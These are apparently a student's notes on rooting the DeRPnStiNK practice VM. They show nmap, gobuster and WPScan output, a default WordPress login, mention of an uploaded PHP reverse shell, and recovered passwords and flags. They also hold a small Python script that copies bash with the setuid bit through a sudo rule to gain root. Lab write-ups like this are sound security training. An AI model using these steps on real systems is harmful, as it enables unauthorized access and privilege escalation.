[*] 2018 [*]

# Date : 06/02/2022

# ->Enumeration Phase;

# Nmap 7.91 scan initiated Sun Feb  6 22:25:14 2022 as: nmap -vv -sC -sV -p- -oN nmap_all 192.168.0.113
Nmap scan report for 192.168.0.113
Host is up, received arp-response (0.00033s latency).
Scanned at 2022-02-06 22:25:15 IST for 13s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMZoT7661ewMcQgzna/qzvkfYaLGwfMnL0VKh3hkBCwGw3jvSXjmjhKw/gR2TnTLFQ9eTDNPTuGsm87dOUSEunbZMvP9GgnA9hOUCI9T1oy5Rs4/AidB9uiVAKN+mefOBBkwhO74UkzNCZw+SX214uaEyK5tQxcROT8hqqLPbu2lAAAAFQCYTgxWroPZExKzHRqCJUbgQaCV6wAAAIEAifRo93uYV4W0l81ybohh+U2vZdqF7FLMXpyvVLv3wcSs1fa6w+0idZ076luA/RWcO/Cavp1q2Yvvyp7E/uKPe9fuDV8Qp4g3FArPQB/Bg+CUL90tNLcAiI+0b6lS8ByfwgMzcinP8fzjWeo3ZRyyU+nGqQaoF9kC951bloDJ48sAAACASzBGZ/bwnBU0oZxhuDg4c2YxD+R96JWBvDvMrqlxqZO1NsAAq5o/GU26++Yrk15mXFZgtkVBxeFXSErjwPkHfMWqY/TNOybUptUtnrqQlvN8tB4VW9sJwbT1AmnAyJZRJZ00x8cxzqvgD6qRyPJCCdNQsUiAnpDQ8RQ5v0cY67M=
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCog1WR41f7pXHcoQcEEDgeARy4bpquU6qGdWxOoc7CSjatxW2e8qi3Le/66/nER15eOFqFXV6dQcS/FQOqjPYtRugPNL16Idrq6BBRhmle+AUCb2Yjwq3rzPnOzonFj2q5FSi6zzMIhTbrIwB8xF9rEazw/4DInYKCChtN7+xZC5SWk5tXf9/2hrWhvEg8mM0HYjs31SkfO2qn4OyV6/rT+sPts39ILVLN7p8IiOU8vFdbOt4K5xPgTlUIFdHotVHjkakgYZ2cb32DCu/c/qZ3xRU2kcTL2qjL4Q6crDajXWBpyNGyFhjx88hindUTU6I6BnaWCjaDFabk7JODrf8J
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPbUzlHO4L0CcRTLxyaFkqvqoQikn5j1oipMTeYmvIp4D3o7Ht4tvVG9H+hGyX2+jz5cHwx9knygVi9CuXDU9t4=
|   256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK5AF6Fe/U78KCW1vdVjGoYR9NHOpICUnz6uQgVGETII
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
MAC Address: 08:00:27:6E:90:8E (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  6 22:25:28 2022 -- 1 IP address (1 host up) scanned in 14.43 seconds

# gobuster:

    /weblog               (Status: 301) [Size: 314] [--> http://192.168.0.113/weblog/]
    /php                  (Status: 301) [Size: 311] [--> http://192.168.0.113/php/]   
    /css                  (Status: 301) [Size: 311] [--> http://192.168.0.113/css/]   
    /js                   (Status: 301) [Size: 310] [--> http://192.168.0.113/js/]    
    /javascript           (Status: 301) [Size: 318] [--> http://192.168.0.113/javascript/]
    /temporary            (Status: 301) [Size: 317] [--> http://192.168.0.113/temporary/] 
    /server-status        (Status: 403) [Size: 293]

# wp-scan :

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://derpnstink.local/weblog/ [192.168.0.113]
[+] Started: Sun Feb  6 22:35:09 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.7 (Ubuntu)
 |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://derpnstink.local/weblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'

[+] WordPress theme in use: twentysixteen
 | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: 'Version: 1.3'


[i] User(s) Identified:

[+] unclestinky
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Feb  6 22:35:14 2022
[+] Requests Done: 54
[+] Cached Requests: 8
[+] Data Sent: 14.696 KB
[+] Data Received: 225.69 KB
[+] Memory used: 179.496 MB
[+] Elapsed time: 00:00:05
                          

>> # wordpress login : admin:admin
>> login into wordpress and make new slide.
>> and upload a php-reverse shell and run that slide,got  a www-data shell. 

# ->Exploitation Phase:

# flag3.txt : flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)

>> # unclestinky : wedgie57

define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

>> nothing found in mysql.
>> but user stinky have same password of wordpress user unclestinky
>> got a stinky user shell.


>> flag2 find in wordpress account of unclestinky user.
# Flag2.txt : flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)

# ->PostExploitaion Phase:

>> found pcap file : derpissues.pcap
>> in which found a password of mrderp user.

>> # username : mrderp
>> # password : derpderpderpderpderpderpderp

>> run : sudo -l
>> sudo permission : (ALL) /home/mrderp/binaries/derpy*

>> make a directory having name 'binaries' and in that directory make 'derpy.py' file.
>> put following code in that file.

#!/usr/bin/python3

import os
os.system("cp /bin/bash bash")
os.system("chmod +s bash")

>> bash file is generated having root permission.
>> run : ./bash -p
>> got a root

# Proof.txt :

flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
Congrats on rooting my first VulnOS!
Hit me up on twitter and let me know your thoughts!
@securekomodo

